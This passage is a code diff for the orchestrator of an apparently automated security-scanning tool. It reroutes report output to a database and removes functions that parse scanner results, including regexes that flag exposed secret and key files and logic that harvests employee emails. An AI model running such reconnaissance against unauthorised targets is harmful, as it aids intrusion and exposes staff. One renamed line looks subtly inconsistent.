                 logger.info(f"[V2ExploitCycle] Post-exploitation coverage={conv:.1%}, "
                             f"gaps={len(self.coverage_matrix.get_gaps())}, "
                             f"blocked={len(self.coverage_matrix.get_blocked())}")
@@ -2833,11 +2549,22 @@ class CentralBrain:
             except Exception as e:
                 logger.warning(f"[ReviewQueue] Population failed (non-fatal): {e}")
 
+            # Artifact-writing hooks are gated by REPORTS_ENABLED (default off).
+            from core.common.reports_config import reports_enabled as _reports_enabled, reports_dir as _reports_dir
+            _reports_on = _reports_enabled()
+            _rdir = _reports_dir() if _reports_on else None
+
+            # Artifacts always persist to Postgres (scan_artifacts). When
+            # REPORTS_ENABLED=1 they also write to disk in reports/.
+            _sid = getattr(self, "_scan_id", None) or getattr(self.ctx, "scan_id", None)
+
             # Evidence Screenshot Capture — screenshot vulnerable pages as proof
             if self.ctx.vulnerabilities:
                 try:
                     from core.evidence.screenshot_capture import ScreenshotCapture
-                    screenshotter = ScreenshotCapture(output_dir="reports/evidence")
+                    screenshotter = ScreenshotCapture(
+                        output_dir=str(_rdir / "evidence") if _reports_on else None,
+                        scan_id=_sid)
                     screenshotter.capture_findings(self.ctx.vulnerabilities, max_screenshots=20)
                     ev_summary = screenshotter.get_evidence_summary()
                     logger.info(f"[Screenshots] {ev_summary['successful']}/{ev_summary['total_attempted']} captured")
@@ -2848,25 +2575,38 @@ class CentralBrain:
             if self.ctx.vulnerabilities:
                 try:
                     from core.tools.nuclei_template_gen import NucleiTemplateGenerator
-                    template_gen = NucleiTemplateGenerator(output_dir="reports/custom_templates")
+                    template_gen = NucleiTemplateGenerator(
+                        output_dir=str(_rdir / "custom_templates") if _reports_on else None,
+                        scan_id=_sid)
                     generated = template_gen.generate_all(self.ctx.vulnerabilities, max_templates=50)
                     if generated:
                         logger.info(f"[TemplateGen] Generated {len(generated)} custom nuclei templates")
                 except Exception as e:
                     logger.warning(f"[TemplateGen] Generation failed (non-fatal): {e}")
 
-            # SARIF Export — auto-generate SARIF for CI/CD integration
+            # SARIF Export — always persist to DB; also to disk when enabled
             if self.ctx.vulnerabilities:
                 try:
                     from core.reporting.sarif_export import SARIFExporter
                     sarif_exporter = SARIFExporter()
-                    sarif_path = "reports/findings.sarif"
-                    sarif_exporter.export(
-                        self.ctx.vulnerabilities,
-                        target=self.ctx.target,
-                        output_path=sarif_path,
-                    )
-                    logger.info(f"[SARIF] Exported {len(self.ctx.vulnerabilities)} findings to {sarif_path}")
+                    sarif_json = sarif_exporter.build(
+                        self.ctx.vulnerabilities, target=self.ctx.target) \
+                        if hasattr(sarif_exporter, "build") else None
+                    if _reports_on:
+                        sarif_path = str(_rdir / "findings.sarif")
+                        sarif_exporter.export(self.ctx.vulnerabilities,
+                                              target=self.ctx.target,
+                                              output_path=sarif_path)
+                        logger.info(f"[SARIF] Exported {len(self.ctx.vulnerabilities)} findings to {sarif_path}")
+                    if _sid and sarif_json is not None:
+                        from core.database.pg_store import ScanArtifactRepo
+                        ScanArtifactRepo.insert(
+                            _sid, "sarif", "findings.sarif",
+                            json.dumps(sarif_json, indent=2, default=str)
+                                if not isinstance(sarif_json, str) else sarif_json,
+                            mime_type="application/sarif+json",
+                            metadata={"vuln_count": len(self.ctx.vulnerabilities)})
+                        logger.info(f"[SARIF] Persisted to Postgres for scan {_sid}")
                 except Exception as e:
                     logger.warning(f"[SARIF] Export failed (non-fatal): {e}")
 
@@ -2929,29 +2669,46 @@ class CentralBrain:
                     f if isinstance(f, dict) else getattr(f, '__dict__', {})
                     for f in all_findings
                 ]
-                canonical_path = self.canonical_reporter.save_json("reports/canonical_summary.json")
+                # Canonical summary → DB (always) and disk (when enabled)
+                canonical_path = self.canonical_reporter.save_json(
+                    str(_rdir / "canonical_summary.json") if _reports_on else None,
+                    scan_id=_sid)
+                if canonical_path:
+                    logger.info(f"[CanonicalReporter] Saved to {canonical_path}")
                 canonical_md = self.canonical_reporter.generate_markdown()
                 self.ctx.update('canonical_report_md', canonical_md)
-                logger.info(f"[CanonicalReporter] Saved to {canonical_path}")
+                if _sid and canonical_md:
+                    try:
+                        from core.database.pg_store import ScanArtifactRepo
+                        ScanArtifactRepo.insert(
+                            _sid, "canonical_markdown", "canonical_summary.md",
+                            canonical_md, mime_type="text/markdown")
+                    except Exception as _e:
+                        logger.debug(f"[CanonicalReporter] MD persist failed: {_e}")
 
                 # Strix Pattern #2: Persist coverage tracker report
+                if _reports_on:
+                    try:
+                        self.coverage_tracker.persist(str(_rdir / "coverage_tracker.json"))
+                    except Exception as ct_e:
+                        logger.debug(f"[CoverageTracker] Persist failed: {ct_e}")
                 try:
-                    self.coverage_tracker.persist("reports/coverage_tracker.json")
                     ct_report = self.coverage_tracker.generate_report()
                     self.ctx.update('coverage_tracker_report', ct_report)
                     logger.info(f"[CoverageTracker] {ct_report.get('coverage', {}).get('honest_summary', '')}")
                 except Exception as ct_e:
-                    logger.debug(f"[CoverageTracker] Persist failed: {ct_e}")
+                    logger.debug(f"[CoverageTracker] Report failed: {ct_e}")
 
                 # Strix Pattern #3: Log and persist retry stats
                 try:
                     retry_stats = self.retry_executor.stats
                     logger.info(f"[RetryExecutor] Stats: {retry_stats}")
                     self.ctx.update('retry_stats', retry_stats)
-                    import json as _json
-                    retry_path = Path("reports/retry_stats.json")
-                    retry_path.parent.mkdir(parents=True, exist_ok=True)
-                    retry_path.write_text(_json.dumps(retry_stats, default=str), encoding="utf-8")
+                    if _reports_on:
+                        import json as _json
+                        retry_path = _rdir / "retry_stats.json"
+                        retry_path.parent.mkdir(parents=True, exist_ok=True)
+                        retry_path.write_text(_json.dumps(retry_stats, default=str), encoding="utf-8")
                 except Exception:
                     pass
             except Exception as e:
@@ -2977,7 +2734,7 @@ class CentralBrain:
 
             # ── V2 Hook: Convergence final evaluation ──
             try:
-                conv_status = self.convergence_engine_v2.evaluate(
+                conv_status = self.convergence_engine.evaluate(
                     remaining_tests=len(self.coverage_matrix.get_gaps()) if hasattr(self, 'coverage_matrix') and self.coverage_matrix else 0,
                     blocked_tests=len(self.coverage_matrix.get_blocked()) if hasattr(self, 'coverage_matrix') and self.coverage_matrix else 0,
                     budget_exhausted=getattr(self.budget_governor, 'is_exhausted', lambda: False)() if hasattr(self, 'budget_governor') else False,
@@ -2996,7 +2753,7 @@ class CentralBrain:
             try:
                 v2_conv = 0.0
                 try:
-                    v2_conv = self.convergence_engine_v2.calculate_convergence()
+                    v2_conv = self.convergence_engine.calculate_convergence()
                 except Exception:
                     pass
                 self.secure_checkpoint.save_checkpoint({
@@ -3469,7 +3226,7 @@ class CentralBrain:
                 coverage_summary=self.coverage_matrix.get_coverage() if hasattr(self, 'coverage_matrix') and self.coverage_matrix else {},
                 identities=list(self.security_context_v2.identities.keys()) if hasattr(self, 'security_context_v2') else [],
                 learning_summary=self.structured_learning.get_summary() if hasattr(self, 'structured_learning') and hasattr(self.structured_learning, 'get_summary') else {},
-                convergence_status=self.convergence_engine_v2.check() if hasattr(self, 'convergence_engine_v2') and hasattr(self.convergence_engine_v2, 'check') else None,
+                convergence_status=self.convergence_engine.check() if hasattr(self, 'convergence_engine_v2') and hasattr(self.convergence_engine, 'check') else None,
                 budget_status=self.granular_budget.remaining_summary() if hasattr(self, 'granular_budget') else {},
             )
             v2_state_str = json.dumps(v2_state, default=str)[:3000]
@@ -3714,439 +3471,6 @@ class CentralBrain:
             if self._evaluate_phase_gate(phase, db_context):
                 logger.info(f"Phase gate satisfied for phase {phase}. Advancing to next phase.")
                 break
-
-    def _ingest_executor_findings(self, test_id: str, target: str, evidence: dict) -> None:
-        """Convert V2 executor evidence into SharedContext vulnerability records."""
-        SEVERITY_MAP = {
-            "jwt": "HIGH", "nosqli": "CRITICAL", "upload": "HIGH",
-            "proto_pollution": "MEDIUM", "ssrf": "HIGH", "xxe": "HIGH",
-            "csrf": "MEDIUM", "idor": "HIGH", "mass_assignment": "HIGH",
-            "bizlogic": "MEDIUM", "race_condition": "MEDIUM",
-            # Tier 1
-            "ssti": "CRITICAL", "cmdi": "CRITICAL", "redirect": "MEDIUM",
-            "oauth": "HIGH", "captcha": "MEDIUM", "password": "MEDIUM",
-            "ratelimit": "MEDIUM", "log": "MEDIUM", "backup": "HIGH",
-            "hidden": "HIGH", "git": "CRITICAL", "env": "CRITICAL",
-            # Tier 2 prefixes
-            "sqli": "CRITICAL", "xss": "HIGH", "lfi": "HIGH",
-            # Tier 3
-            "sca": "HIGH", "waf": "MEDIUM",
-            # Tier 5
-            "mfa": "CRITICAL", "crypto": "HIGH", "content": "MEDIUM",
-            # Tier 6
-            "stego": "MEDIUM", "video": "MEDIUM", "subtitle": "MEDIUM",
-            "nested": "MEDIUM", "web3": "CRITICAL", "race": "HIGH",
-            "hidden": "MEDIUM", "gdpr": "HIGH", "error": "MEDIUM",
-            "encoding": "HIGH",
-            # Tier 7
-            "smuggling": "CRITICAL", "deser": "CRITICAL", "cloud": "HIGH",
-            "subdomain": "HIGH", "ldap": "HIGH", "csp": "MEDIUM",
-            "cache": "HIGH", "dom": "MEDIUM", "saml": "CRITICAL",
-            "prompt": "HIGH", "cicd": "HIGH", "basic": "HIGH",
-            "rate": "MEDIUM",
-            # Tier 8
-            "aws": "CRITICAL", "azure": "CRITICAL", "gcp": "CRITICAL",
-            "k8s": "CRITICAL", "ci": "CRITICAL",
-            "jenkins": "CRITICAL", "gitlab": "HIGH",
-            "reflected": "HIGH", "postmessage": "HIGH",
-            "clickjacking": "MEDIUM",
-        }
-        test_prefix = test_id.split("_")[0] if "_" in test_id else test_id
-        default_sev = SEVERITY_MAP.get(test_prefix, "MEDIUM")
-
-        findings_keys = [k for k in evidence if k.endswith("_findings") or k == "logic_findings"]
-        for fk in findings_keys:
-            items = evidence.get(fk, [])
-            if not isinstance(items, list):
-                continue
-            for item in items:
-                if not isinstance(item, dict):
-                    continue
-                test_name = item.get("test", test_id)
-                vuln = {
-                    "type": test_id.upper(),
-                    "title": f"Deterministic test: {test_name} on {item.get('path', item.get('endpoint', target))}",
-                    "severity": default_sev,
-                    "status": "CONFIRMED" if item.get("status") in (200, 201) else "UNCONFIRMED",
-                    "target": target,
-                    "location": item.get("path", item.get("endpoint", "")),
-                    "evidence": item.get("body_snippet", ""),
-                    "source": "deterministic_executor",
-                    "test_id": test_id,
-                }
-                self.ctx.add_vulnerability(vuln)
-
-        # Also check for direct boolean indicators
-        for bool_key in ["vulnerable", "introspection_enabled", "directory_listing", "traversal_detected"]:
-            if evidence.get(bool_key):
-                vuln = {
-                    "type": test_id.upper(),
-                    "title": f"Deterministic test: {bool_key} detected ({test_id})",
-                    "severity": default_sev,
-                    "status": "CONFIRMED",
-                    "target": target,
-                    "source": "deterministic_executor",
-                    "test_id": test_id,
-                }
-                self.ctx.add_vulnerability(vuln)
-
-    def _ingest_approach_a_result(self, capability: str, target: str, result: Any) -> None:
-        """Parse and ingest tool results into SharedContext and knowledge stores."""
-        if not result or not result.success:
-            return
-        
-        stdout = getattr(result, "stdout", "") or ""
-        data = getattr(result, "data", {}) or {}
-        
-        # 1. Ingest Subdomains
-        # FIX: extract hostnames from ANY output format (dnsenum/fierce/assetfinder emit
-        # column-formatted reports, not bare-domain-per-line). Scope matches to the apex.
-        discovered_subs = set(data.get("subdomains", []) or data.get("domains", []))
-        apex = target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0].lower()
-        apex = apex[4:] if apex.startswith("www.") else apex
-        if stdout and apex:
-            host_re = re.compile(r'\b((?:[a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,})\.?\b')
-            for match in host_re.findall(stdout):
-                host = match.rstrip('.').lower()
-                if host == apex or host.endswith('.' + apex):
-                    discovered_subs.add(host)
-        
-        if discovered_subs:
-            self.ctx.add_subdomains(list(discovered_subs), source=getattr(result, "tool", capability))
-            if hasattr(self, "persistent_knowledge_store") and self.persistent_knowledge_store:
-                for sub in discovered_subs:
-                    try:
-                        self.persistent_knowledge_store.add_asset(self.target_id, "subdomain", sub)
-                    except Exception:
-                        pass
-        
-        # 2. Ingest Technologies & HTTP status
-        techs = data.get("technologies") or data.get("tech") or []
-        target_host = target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
-        if techs:
-            self.ctx.add_technologies(target_host, techs if isinstance(techs, list) else [str(techs)])
-        elif stdout and ("[" in stdout or "http" in stdout):
-            for line in stdout.splitlines()[:5]:
-                if "[" in line and "]" in line:
-                    parts = re.findall(r'\[(.*?)\]', line)
-                    if parts:
-                        self.ctx.add_technologies(target_host, parts[:4])
-                        break
-        
-        # 3. Ingest Open Ports
-        ports = data.get("ports") or data.get("open_ports") or []
-        if not ports and stdout:
-            for line in stdout.splitlines():
-                match = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
-                if match:
-                    ports.append({"port": int(match.group(1)), "service": match.group(2)})
-        if ports:
-            self.ctx.add_ports(target_host, ports)
-
-        # 4. Ingest Endpoints from ANY tool that discovers URLs
-        _ep_caps = ("endpoint_discovery", "web_crawling", "directory_bruteforce",
-                     "api_enumeration", "vulnerability_scanning", "technology_fingerprinting")
-        if stdout and capability in _ep_caps:
-            endpoints = []
-            for line in stdout.splitlines():
-                line = line.strip()
-                if not line:
-                    continue
-                # ffuf CSV-style: URL  [Status: 200, Size: 1234, ...]
-                m = re.search(r'(https?://\S+)\s+\[Status:\s*(\d+)', line)
-                if m:
-                    endpoints.append({"url": m.group(1), "status": int(m.group(2))})
-                    continue
-                # gobuster/feroxbuster: STATUS  SIZE  URL
-                m = re.search(r'^(\d{3})\s+\S+\s+(https?://\S+)', line)
-                if m:
-                    endpoints.append({"url": m.group(2), "status": int(m.group(1))})
-                    continue
-                # bare URL lines (katana output)
-                m = re.match(r'^(https?://\S+)$', line)
-                if m:
-                    url = m.group(1)
-                    # skip static assets
-                    if not re.search(r'\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map)(\?|$)', url, re.I):
-                        endpoints.append({"url": url, "status": 0})
-            if endpoints:
-                self.ctx.add_endpoints(endpoints, source=getattr(result, "tool", capability))
-                logger.info(f"Ingested {len(endpoints)} endpoints from {getattr(result, 'tool', capability)}")
-
-        # 4b. Ingest directories from ffuf/gobuster/dirb/feroxbuster
-        if stdout and capability in ("directory_bruteforce", "endpoint_discovery", "web_crawling"):
-            tool_name = getattr(result, "tool", "")
-            for line in stdout.splitlines():
-                line = line.strip()
-                # directory paths (ending with /)
-                m = re.search(r'(https?://\S+/)\s', line)
-                if m:
-                    self.ctx.add_directory(m.group(1))
-                # /ftp/ style directory listings
-                m = re.search(r'(/[a-zA-Z0-9._-]+/)\s', line)
-                if m and len(m.group(1)) > 2:
-                    self.ctx.add_directory(f"{target.rstrip('/')}{m.group(1)}")
-
-        # 5. Ingest Vulnerability findings from nikto/nuclei output
-        if capability == "vulnerability_scanning" and stdout:
-            vulns = []
-            tool_name = getattr(result, "tool", "unknown")
-            for line in stdout.splitlines():
-                line = line.strip()
-                if not line:
-                    continue
-                # nuclei JSONL output (preferred — machine-parseable)
-                if line.startswith("{") and '"template-id"' in line or '"template_id"' in line:
-                    try:
-                        import json as _json
-                        ndata = _json.loads(line)
-                        info = ndata.get("info", {})
-                        tid = ndata.get("template-id") or ndata.get("template_id") or "unknown"
-                        title = info.get("name") or tid
-                        sev = (info.get("severity") or "medium").upper()
-                        matched_at = ndata.get("matched-at") or ndata.get("matched") or target
-                        classification = info.get("classification", {})
-                        cve_ids = classification.get("cve-id") or classification.get("cve_id") or []
-                        if isinstance(cve_ids, str):
-                            cve_ids = [cve_ids]
-                        vulns.append({
-                            "type": "NUCLEI_MATCH",
-                            "title": f"Nuclei: {title}",
-                            "severity": sev,
-                            "target": target,
-                            "location": matched_at,
-                            "template_id": tid,
-                            "cve": ", ".join(cve_ids) if cve_ids else "",
-                            "proof": f"Nuclei template '{tid}' matched at {matched_at}",
-                            "details": info.get("description", f"Template {tid} matched"),
-                            "tool": "nuclei",
-                        })
-                        continue
-                    except Exception:
-                        pass
-                # nikto: + OSVDB-XXXX: description  OR  + description
-                m = re.match(r'^\+\s+(OSVDB-\d+:\s*)?(.+)', line)
-                _nikto_noise = (
-                    "+ Target", "+ Start", "+ End", "+ Server:",
-                    "+ SSL Info:", "+ Platform:", "+ No CGI Dir",
-                    "+ Scan terminated", "+ host(s) tested",
-                    "+ Multiple IPs", "+ Hostname:",
-                )
-                if m and not any(line.startswith(p) for p in _nikto_noise):
-                    osvdb = (m.group(1) or "").strip().rstrip(":")
-                    desc = m.group(2).strip()
-                    if len(desc) > 10 and not re.match(r'^\d+\s+host\(s\)\s+tested', desc):
-                        sev = "MEDIUM"
-                        if any(k in desc.lower() for k in ("xss", "inject", "rce", "remote code", "execution")):
-                            sev = "HIGH"
-                        elif any(k in desc.lower() for k in ("missing", "header", "cookie", "info", "uncommon")):
-                            sev = "LOW"
-                        vulns.append({
-                            "type": "NIKTO_FINDING",
-                            "title": desc[:120],
-                            "severity": sev,
-                            "target": target,
-                            "location": target,
-                            "proof": f"nikto: {line.strip()}",
-                            "details": desc,
-                            "tool": tool_name,
-                            "osvdb": osvdb,
-                        })
-                        continue
-                # nuclei plaintext: [template-id] [severity] [protocol] URL
-                m = re.match(r'^\[([^\]]+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(\S+)', line)
-                if m:
-                    vulns.append({
-                        "type": "NUCLEI_MATCH",
-                        "title": f"Nuclei: {m.group(1)}",
-                        "severity": m.group(2).upper(),
-                        "target": target,
-                        "location": m.group(4),
-                        "template_id": m.group(1),
-                        "proof": line,
-                        "details": f"Template {m.group(1)} matched at {m.group(4)}",
-                        "tool": "nuclei",
-                    })
-            if vulns:
-                for v in vulns:
-                    if hasattr(self.ctx, 'add_vulnerability'):
-                        self.ctx.add_vulnerability(v)
-                for v in vulns:
-                    logger.info(f"  [VULN] [{v.get('severity','?')}] {v.get('title','')} | type={v.get('type','')} | location={v.get('location','')}")
-                    self._log_activity("finding",
-                        f"[{v.get('severity','?')}] {v.get('title','')}",
-                        tool=tool_name, target=v.get('location', target),
-                        detail=f"Type: {v.get('type','')} | {v.get('details','')[:200]}",
-                        output_data=str(v.get('proof', ''))[:1000])
-                logger.info(f"Ingested {len(vulns)} vulnerability findings from {tool_name}")
-
-        # 6. Ingest TLS/SSL findings from sslscan output
-        if capability == "tls_analysis" and stdout:
-            tls_findings = []
-            ssl_data = {"protocols": [], "ciphers": [], "certificate": {}}
-            for line in stdout.splitlines():
-                # Parse SSL protocol acceptance
-                m_proto = re.search(r'((?:SSL|TLS)v[\d.]+)\s+(\d+)\s+bits\s+(\S+)\s+(Accepted|Rejected)', line)
-                if m_proto:
-                    entry = {"protocol": m_proto.group(1), "bits": int(m_proto.group(2)),
-                             "cipher": m_proto.group(3), "status": m_proto.group(4)}
-                    ssl_data["ciphers"].append(entry)
-                    if m_proto.group(4) == "Accepted":
-                        proto = m_proto.group(1)
-                        if proto not in ssl_data["protocols"]:
-                            ssl_data["protocols"].append(proto)
-                        if proto in ("SSLv2", "SSLv3"):
-                            tls_findings.append({
-                                "type": "TLS_WEAKNESS",
-                                "title": f"Deprecated SSL protocol accepted: {line.strip()[:80]}",
-                                "severity": "HIGH", "target": target, "location": target,
-                                "proof": line.strip(),
-                                "details": "Server accepts deprecated SSL protocol version",
-                                "tool": "sslscan",
-                            })
-                # Parse certificate info
-                m_subj = re.search(r'Subject:\s+(.+)', line)
-                if m_subj:
-                    ssl_data["certificate"]["subject"] = m_subj.group(1).strip()
-                m_issuer = re.search(r'Issuer:\s+(.+)', line)
-                if m_issuer:
-                    ssl_data["certificate"]["issuer"] = m_issuer.group(1).strip()
-                m_exp = re.search(r'Not valid after:\s+(.+)', line)
-                if m_exp:
-                    ssl_data["certificate"]["expires"] = m_exp.group(1).strip()
-
-            if "Heartbleed" in stdout and "vulnerable" in stdout.lower() and "not vulnerable" not in stdout.lower():
-                tls_findings.append({
-                    "type": "TLS_WEAKNESS",
-                    "title": "Heartbleed vulnerability detected",
-                    "severity": "CRITICAL", "target": target, "location": target,
-                    "proof": "sslscan Heartbleed test positive",
-                    "details": "Server is vulnerable to Heartbleed (CVE-2014-0160)",
-                    "tool": "sslscan",
-                })
-            if tls_findings:
-                for v in tls_findings:
-                    self.ctx.add_vulnerability(v)
-                logger.info(f"Ingested {len(tls_findings)} TLS findings from sslscan")
-            if ssl_data["protocols"] or ssl_data["certificate"]:
-                self.ctx.add_ssl_info(target_host, ssl_data)
-                logger.info(f"Stored SSL info for {target_host}: {len(ssl_data['protocols'])} protocols, {len(ssl_data['ciphers'])} ciphers")
-
-        # 7. Ingest HTTP headers from curl/httpx/whatweb output and flag missing ones
-        if capability in ("http_analysis", "technology_fingerprinting") and stdout:
-            important_headers = {
-                "X-Frame-Options": ("Missing X-Frame-Options header", "Clickjacking protection not enabled"),
-                "Content-Security-Policy": ("Missing Content-Security-Policy header", "No CSP policy configured"),
-                "Strict-Transport-Security": ("Missing HSTS header", "HSTS not enforced"),
-                "X-Content-Type-Options": ("Missing X-Content-Type-Options header", "MIME sniffing protection not enabled"),
-            }
-            parsed_headers = {}
-            for line in stdout.splitlines():
-                m_hdr = re.match(r'^([A-Za-z][A-Za-z0-9-]+):\s+(.+)', line)
-                if m_hdr:
-                    parsed_headers[m_hdr.group(1)] = m_hdr.group(2).strip()
-            if parsed_headers:
-                self.ctx.add_headers(target_host, parsed_headers)
-                logger.info(f"Stored {len(parsed_headers)} HTTP headers for {target_host}")
-            response_headers = set()
-            for line in stdout.splitlines():
-                for hdr in important_headers:
-                    if hdr.lower() in line.lower():
-                        response_headers.add(hdr)
-
-        # 8. Ingest secrets/sensitive files from tool output
-        if stdout:
-            _secret_patterns = [
-                (r'(\.git/config|\.git/HEAD)\b', "Git repository exposed", "HIGH"),
-                (r'(/\.env|\.env\.bak|\.env\.local)\b', "Environment file exposed", "HIGH"),
-                (r'(\.kdbx|\.key|\.pem|\.p12|\.pfx)\b', "Sensitive key/credential file", "MEDIUM"),
-                (r'(password|secret|api[_-]?key|token|credential)\s*[:=]\s*\S+', "Hardcoded secret", "HIGH"),
-                (r'(/ftp/[^\s]+\.(?:md|txt|pdf|bak|sql))', "Sensitive file in FTP directory", "MEDIUM"),
-            ]
-            for pattern, desc, severity in _secret_patterns:
-                for m in re.finditer(pattern, stdout, re.IGNORECASE):
-                    self.ctx.add_secret({
-                        "type": desc, "value": m.group(0)[:200], "location": target,
-                        "severity": severity, "tool": getattr(result, "tool", capability),
-                    })
-
-        # 9. Ingest directory listings from tool output
-        if stdout and capability in ("directory_bruteforce", "endpoint_discovery", "web_crawling",
-                                     "vulnerability_scanning", "technology_fingerprinting"):
-            _dir_re = re.compile(r'(?:Directory|Index of|listing)\s+(?:of\s+)?(https?://\S+|/\S+)', re.IGNORECASE)
-            for m in _dir_re.finditer(stdout):
-                self.ctx.add_directory(m.group(1))
-
-        # 10. Ingest OSINT data (emails, employees, GitHub info) from theHarvester/whois
-        if capability in ("employee_enumeration", "osint", "whois_lookup") and stdout:
-            tool_name = getattr(result, "tool", capability)
-            # Extract emails
-            emails = set()
-            email_re = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
-            for m in email_re.finditer(stdout):
-                email = m.group(0).lower()
-                if apex in email or not email.endswith(('.png', '.jpg', '.gif')):
-                    emails.add(email)
-            if emails:
-                existing = self.ctx.get("discovered_employees", []) or []
-                existing_emails = {e.get("email", "").lower() for e in existing if isinstance(e, dict)}
-                for email in emails:
-                    if email.lower() not in existing_emails:
-                        name_part = email.split("@")[0].replace(".", " ").replace("_", " ").replace("-", " ")
-                        existing.append({"email": email, "name": name_part.title(), "source": tool_name})
-                self.ctx.update("discovered_employees", existing)
-                logger.info(f"Ingested {len(emails)} emails from {tool_name}")
-
-            # Extract GitHub users/orgs
-            gh_re = re.compile(r'github\.com/([a-zA-Z0-9_-]+)')
-            gh_users = set()
-            for m in gh_re.finditer(stdout):
-                gh_users.add(m.group(1))
-            if gh_users:
-                existing_gh = self.ctx.get("github_profiles", []) or []
-                existing_names = {g.get("username", "") for g in existing_gh if isinstance(g, dict)}
-                for user in gh_users:
-                    if user not in existing_names:
-                        existing_gh.append({"username": user, "source": tool_name})
-                self.ctx.update("github_profiles", existing_gh)
-
-            # Extract leaked credential indicators
-            cred_patterns = [
-                r'(\d+)\s+(?:compromised|leaked|breached)\s+(?:user|credential|account)',
-                r'(?:compromised|leaked|breached)\s+(?:user|credential|account)s?[:]\s*(\d+)',
-            ]
-            for pat in cred_patterns:
-                m = re.search(pat, stdout, re.IGNORECASE)
-                if m:
-                    count = int(m.group(1))
-                    existing_creds = self.ctx.get("leaked_credentials", []) or []
-                    existing_creds.append({
-                        "type": "breach_indicator", "source": tool_name,
-                        "count": count, "note": f"{count} compromised credentials reported",
-                    })
-                    self.ctx.update("leaked_credentials", existing_creds)
-
-        # 11. Record tool invocation in tool_executions (not captured_requests)
-        tool_name = getattr(result, "tool", capability)
-        command = getattr(result, "command", "") or ""
-        if command:
-            exec_record = {
-                "tool": tool_name, "command": command[:500], "target": target,
-                "capability": capability, "success": bool(result.success),
-                "stdout_bytes": len(stdout),
-            }
-            self.ctx.add_tool_execution(exec_record)
-            try:
-                from core.database.pg_store import ToolExecutionRepo
-                ToolExecutionRepo.save(
-                    scan_id=self.scan_id, tool=tool_name,
-                    command=command[:500], target=target,
-                    capability=capability, success=bool(result.success),
-                    stdout_bytes=len(stdout))
-            except Exception:
-                pass
-
-        self._write_progress({"status": "running"})
 
     async def _run_phase_approach_b(self, phase: str):
         logger.info(f"--- Running Approach B for phase: {phase} ---")
@@ -4492,7 +3816,7 @@ class CentralBrain:
                                 break
 
                         # Run each remaining test via its executor
-                        from core.domain.experiment_v2 import SecurityExperiment
+                        from core.domain.experiment import SecurityExperiment
                         fallback_ran = 0
                         for tid in remaining[:80]:
                             executor = self.executor_registry.get(tid)
@@ -4814,201 +4138,6 @@ class CentralBrain:
         for act in self.automation.evaluate():
             logger.info(f"Automation recommends: {act['action']} ({act['rule']})")
     
-    async def _persist_recon_findings(self):
-        """Save recon discoveries to knowledge store."""
-        try:
-            logger.info("Persisting recon findings...")
-            
-            # ── Debug: Log what's actually in the context ──
-            logger.debug(f"subdomains: {getattr(self.ctx, 'subdomains', [])}")
-            logger.debug(f"ips: {getattr(self.ctx, 'ips', [])}")
-            
-            ports = getattr(self.ctx, 'ports', [])
-            if isinstance(ports, dict):
-                logger.debug(f"ports keys: {ports.keys()}")
-            else:
-                logger.debug(f"ports is list, len: {len(ports)}")
-            
-            # ── Subdomains ──
-            if hasattr(self.ctx, 'subdomains') and self.ctx.subdomains:
-                from core.security.authorization import TargetScopeValidator
-                _sv = TargetScopeValidator.get()
-                for subdomain in self.ctx.subdomains:
-                    self.persistent_knowledge_store.add_asset(
-                        self.target_id, "subdomain", subdomain,
-                        metadata=json.dumps({"discovered_at": datetime.now().isoformat()})
-                    )
-                    # Authorize the IPs each in-scope subdomain resolves to, so a
-                    # follow-up scan of that IP is not blocked as out-of-scope.
-                    try:
-                        _sv.note_resolution(subdomain)
-                    except Exception:
-                        pass
-                logger.info(f"  ✓ Persisted {len(self.ctx.subdomains)} subdomains")
-            
-            # ── IPs ──
-            if hasattr(self.ctx, 'ips') and self.ctx.ips:
-                from core.security.authorization import TargetScopeValidator
-                scope_validator = TargetScopeValidator.get()
-                for ip in self.ctx.ips:
-                    scope_validator.add_target(ip)
-                    self.persistent_knowledge_store.add_asset(
-                        self.target_id, "ip", ip,
-                        metadata=json.dumps({"discovered_at": datetime.now().isoformat()})
-                    )
-                logger.info(f"  ✓ Persisted {len(self.ctx.ips)} IPs (added to authorized scope)")
-            
-            # ── Ports - FIXED ──
-            if hasattr(self.ctx, 'ports') and self.ctx.ports:
-                ports = self.ctx.ports
-                if isinstance(ports, dict):
-                    for host, port_list in ports.items():
-                        host_asset_id = self.persistent_knowledge_store.add_asset(
-                            self.target_id, "host", host,
-                            metadata=json.dumps({"discovered_at": datetime.now().isoformat()})
-                        )
-                        for port_item in port_list:
-                            if isinstance(port_item, dict):
-                                port_num = port_item.get("port", "unknown")
-                                service = port_item.get("service", "unknown")
-                                version = port_item.get("version", "")
-                            else:
-                                port_num = str(port_item)
-                                service = "unknown"
-                                version = ""
-                            self.persistent_knowledge_store.add_technology(
-                                host_asset_id, 
-                                f"{service}:{port_num}", 
-                                version,
-                                source="port_scan"
-                            )
-                    logger.info(f"  ✓ Persisted ports for {len(ports)} hosts")
-                else:
-                    # In V2, it's just a list
-                    host_asset_id = self.persistent_knowledge_store.add_asset(
-                        self.target_id, "host", self.ctx.target,
-                        metadata=json.dumps({"discovered_at": datetime.now().isoformat()})
-                    )
-                    for port_item in ports:
-                        if isinstance(port_item, dict):
-                            port_num = port_item.get("port", "unknown")
-                            service = port_item.get("service", "unknown")
-                            version = port_item.get("version", "")
-                        else:
-                            port_num = str(port_item)
-                            service = "unknown"
-                            version = ""
-                        self.persistent_knowledge_store.add_technology(
-                            host_asset_id, 
-                            f"{service}:{port_num}", 
-                            version,
-                            source="port_scan"
-                        )
-                    logger.info(f"  ✓ Persisted {len(ports)} ports for target")
-            
-            # ── Technologies ──
-            if hasattr(self.ctx, 'technologies') and self.ctx.technologies:
-                for host, techs in self.ctx.technologies.items():
-                    if isinstance(techs, bool) or techs is None:
-                        techs = [host] if isinstance(host, str) else []
-                    elif isinstance(techs, str):
-                        techs = [techs]
-                    elif not isinstance(techs, list):
-                        continue
-                    host_asset_id = self.persistent_knowledge_store.add_asset(
-                        self.target_id, "host", host
-                    )
-                    for tech in techs:
-                        if isinstance(tech, dict):
-                            name = tech.get("name", "")
-                            version = tech.get("version", "")
-                        elif isinstance(tech, str):
-                            name = str(tech)
-                            version = ""
-                        else:
